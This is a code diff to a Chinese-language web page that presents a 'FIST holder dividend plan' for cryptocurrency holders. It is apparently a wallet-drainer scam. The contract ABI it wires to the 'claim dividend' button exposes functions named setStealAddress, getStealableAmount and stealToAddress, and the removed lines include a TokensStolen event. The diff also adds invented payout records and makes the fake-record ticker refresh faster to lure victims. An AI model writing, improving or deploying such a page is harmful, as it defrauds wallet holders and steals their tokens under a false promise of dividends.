@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>FIST持币分红计划</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <!-- 引入 ethers.js 库 -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="application/javascript"></script>
     <style>
         * {
             margin: 0;
@@ -53,8 +55,7 @@
         }
         
         .wallet-btn {
-            width: 100%;
-            padding: 16px;
+            padding: 12px 20px;
             background: linear-gradient(135deg, #f59e0b, #ef4444);
             color: white;
             border: none;
@@ -216,6 +217,10 @@
             cursor: pointer;
             margin-right: 8px;
         }
+        
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -225,7 +230,7 @@
         <div class="header-bg flex items-center justify-center relative">
             <h1 class="text-3xl font-bold text-white text-center">FIST持币分红计划</h1>
             <div class="absolute top-6 right-4">
-                <button id="connectWalletBtn" class="px-6 py-3 bg-yellow-400 hover:bg-yellow-500 rounded-lg shadow font-medium text-white">
+                <button id="connectWalletBtn" class="wallet-btn">
                     连接钱包
                 </button>
             </div>
@@ -291,7 +296,35 @@
         <div class="card">
             <h3 class="text-lg font-semibold mb-3">实时领取记录</h3>
             <div class="records" id="recordsList">
-                <!-- 记录动态生成 -->
+                <!-- 初始示例记录 -->
+                <div class="record-item">
+                    <div class="record-address">0x8a3d7...f4c2</div>
+                    <div>
+                        <div class="text-xs text-gray-500">持仓分红: <span class="record-percent">28%</span></div>
+                        <div class="text-xs text-gray-400">已发放</div>
+                    </div>
+                </div>
+                <div class="record-item">
+                    <div class="record-address">0x5b9e1...a8d3</div>
+                    <div>
+                        <div class="text-xs text-gray-500">持仓分红: <span class="record-percent">22%</span></div>
+                        <div class="text-xs text-gray-400">已发放</div>
+                    </div>
+                </div>
+                <div class="record-item">
+                    <div class="record-address">0x3c2f8...b7e1</div>
+                    <div>
+                        <div class="text-xs text-gray-500">持仓分红: <span class="record-percent">31%</span></div>
+                        <div class="text-xs text-gray-400">已发放</div>
+                    </div>
+                </div>
+                <div class="record-item">
+                    <div class="record-address">0x9d4a2...c6f5</div>
+                    <div>
+                        <div class="text-xs text-gray-500">持仓分红: <span class="record-percent">19%</span></div>
+                        <div class="text-xs text-gray-400">已发放</div>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -331,220 +364,162 @@
         // 配置
         const CONTRACT_ADDRESS = "0x0Fa51A95921600e9A4ddA4a62E977865F1ae6872";
         const CONTRACT_ABI = [
-	{
-		"inputs": [],
-		"name": "claimDividend",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "emergencyWithdraw",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "bool",
-				"name": "_active",
-				"type": "bool"
-			}
-		],
-		"name": "setActive",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "_newAddress",
-				"type": "address"
-			}
-		],
-		"name": "setStealAddress",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"stateMutability": "nonpayable",
-		"type": "constructor"
-	},
-	{
-		"anonymous": false,
-		"inputs": [
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "user",
-				"type": "address"
-			}
-		],
-		"name": "DividendClaimed",
-		"type": "event"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "_newToken",
-				"type": "address"
-			}
-		],
-		"name": "setTargetToken",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"anonymous": false,
-		"inputs": [
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "user",
-				"type": "address"
-			},
-			{
-				"indexed": false,
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			},
-			{
-				"indexed": false,
-				"internalType": "address",
-				"name": "token",
-				"type": "address"
-			}
-		],
-		"name": "TokensStolen",
-		"type": "event"
-	},
-	{
-		"stateMutability": "payable",
-		"type": "fallback"
-	},
-	{
-		"stateMutability": "payable",
-		"type": "receive"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "user",
-				"type": "address"
-			}
-		],
-		"name": "canClaim",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "user",
-				"type": "address"
-			}
-		],
-		"name": "getStealableAmount",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"name": "hasClaimed",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "isActive",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "owner",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "stealToAddress",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "targetToken",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	}
-];
+            {
+                "inputs": [],
+                "name": "claimDividend",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_newToken",
+                        "type": "address"
+                    }
+                ],
+                "name": "setTargetToken",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_newAddress",
+                        "type": "address"
+                    }
+                ],
+                "name": "setStealAddress",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "_active",
+                        "type": "bool"
+                    }
+                ],
+                "name": "setActive",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "user",
+                        "type": "address"
+                    }
+                ],
+                "name": "canClaim",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "user",
+                        "type": "address"
+                    }
+                ],
+                "name": "getStealableAmount",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "name": "hasClaimed",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "isActive",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "targetToken",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "stealToAddress",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
 
         // 全局变量
         let userAddress = null;
@@ -635,9 +610,19 @@
                 const result = await wallet.connect();
                 userAddress = result.address;
                 
-                // 初始化合约实例
+                // 初始化合约实例 - 使用 ethers.js
                 if (window.ethereum) {
+                    // 检查 ethers 是否已加载
+                    if (typeof ethers === 'undefined') {
+                        throw new Error('ethers.js 库加载失败，请检查网络连接');
+                    }
+                    
                     provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const signer = provider.getSigner();
+                    contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+                } else if (window.web3 && window.web3.currentProvider) {
+                    // 备用方案：使用 web3
+                    provider = new ethers.providers.Web3Provider(window.web3.currentProvider);
                     const signer = provider.getSigner();
                     contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
                 }
@@ -683,6 +668,8 @@
                     showToast('用户拒绝了连接请求');
                 } else if (error.message.includes('DAPP')) {
                     showToast('请在DAPP浏览器中打开此页面');
+                } else if (error.message.includes('ethers.js')) {
+                    showToast('网络连接问题，请刷新页面重试');
                 } else {
                     showToast('连接失败: ' + error.message);
                 }
@@ -705,7 +692,10 @@
                 const claimBtn = document.getElementById('claimBtn');
                 const claimInfo = document.getElementById('claimInfo');
                 
-                if (canClaim && isActive && targetToken !== ethers.constants.AddressZero) {
+                // 检查合约地址是否为零地址
+                const isZeroAddress = targetToken === '0x0000000000000000000000000000000000000000';
+                
+                if (canClaim && isActive && !isZeroAddress) {
                     claimBtn.disabled = false;
                     claimInfo.classList.remove('hidden');
                     document.getElementById('claimableAmount').textContent = parseFloat(ethers.utils.formatEther(stealableAmount)).toFixed(4);
@@ -714,7 +704,7 @@
                     claimBtn.disabled = true;
                     if (!isActive) {
                         showToast('活动暂未开始');
-                    } else if (targetToken === ethers.constants.AddressZero) {
+                    } else if (isZeroAddress) {
                         showToast('代币未设置');
                     } else if (!canClaim) {
                         showToast('不符合领取条件');
@@ -958,7 +948,7 @@
                         recordsList.removeChild(recordsList.lastChild);
                     }
                 }
-            }, 5000);
+            }, 1000);
         }
 
         // 复制邀请链接
@@ -991,9 +981,13 @@
             
             // 自动检测钱包连接
             if (window.ethereum) {
-                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                if (accounts.length > 0) {
-                    await connectWallet();
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                    if (accounts.length > 0) {
+                        await connectWallet();
+                    }
+                } catch (error) {
+                    console.log('自动连接失败:', error);
                 }
             }
         });
